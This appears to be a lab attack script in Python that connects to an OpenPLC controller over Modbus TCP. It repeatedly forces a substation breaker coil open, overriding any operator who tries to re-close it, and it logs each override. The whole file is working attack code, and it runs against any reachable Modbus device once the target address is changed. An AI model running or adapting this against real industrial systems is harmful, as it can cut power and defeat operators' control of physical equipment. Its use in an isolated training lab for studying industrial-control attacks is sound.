from pymodbus.client import ModbusTcpClient
import time
import sys

from config import VM1_IP

OPENPLC_IP   = VM1_IP   # VM1 (OpenPLC). Use 172.17.0.2 if run needs the internal Docker IP.
PORT         = 502
COIL         = 0               # Substation_Switch
OPEN_STATE   = False           # False = breaker open/tripped in this lab
REASSERT_SEC = 1.0             # how often to force the open state
RESTORE_ON_EXIT = True         # re-close the breaker when the attack is stopped

def main():
    client = ModbusTcpClient(OPENPLC_IP, port=PORT)
    if not client.connect():
        print(f"[!] could not connect to {OPENPLC_IP}:{PORT}")
        sys.exit(1)

    print(f"[*] Connected to OpenPLC {OPENPLC_IP}:{PORT}")
    print(f"[*] Forcing coil {COIL} = {OPEN_STATE} (breaker OPEN) every {REASSERT_SEC}s")
    print(f"[*] Any operator re-close will be overridden. Ctrl+C to stop.\n")

    overrides = 0
    try:
        while True:
            # read current state first, so we can report when we're actively
            # fighting an operator rather than just holding
            rr = client.read_coils(COIL, count=1, device_id=1)
            current = rr.bits[0] if not rr.isError() else None

            if current is not None and current != OPEN_STATE:
                overrides += 1
                print(f"[!] operator/logic set coil back to {current} — overriding (#{overrides})")

            client.write_coil(COIL, OPEN_STATE, device_id=1)
            time.sleep(REASSERT_SEC)

    except KeyboardInterrupt:
        print(f"\n[*] Stopping. Total operator re-closes overridden: {overrides}")
        if RESTORE_ON_EXIT:
            client.write_coil(COIL, True, device_id=1)
            print("[*] Breaker restored to CLOSED (lab left clean).")
        client.close()

if __name__ == "__main__":
    main()